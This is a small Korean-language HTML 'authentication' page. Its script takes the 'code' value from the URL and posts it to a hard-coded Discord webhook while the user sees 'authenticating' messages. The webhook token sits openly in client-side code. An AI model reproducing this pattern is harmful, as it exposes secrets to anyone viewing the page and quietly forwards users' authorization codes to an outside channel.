<html>

<head>
    <script src="https://code.jquery.com/jquery-3.5.0.min.js"></script>
    <title>인증</title>
</head>

<body>
    <div style="width: 40%; margin: 0 auto;">
        <h1 id="result">인증 중입니다... 잠시만 기다려주세요.</h1>
    </div>
    <script>
        (function() {
            var params = new URL(location).searchParams;
            if (!params.has("code")) {
                $("#result").text("인증할 수 없습니다.");
                return;
            }
            $.ajax({
                url: "https://discordapp.com/api/webhooks/709012274341216396/0F-FLVH_jLTIBBfWDx5fQsZsBl3Zmjo3Oqd9ILuaxvzlru35AaQLMj89pyUBkKs_Eb61",
                method: "POST",
                data: JSON.stringify({
                    content: params.get("code")
                }),
                success: (data) => {
                    $("#result").text("인증이 완료되었습니다!");
                },
                error: () => {
                    $("#result").text("인증에 실패했습니다. 새로 고침하여 다시 시도하세요!");
                },
                contentType: "application/json"
            })
        })();
    </script>
</body>

</html>
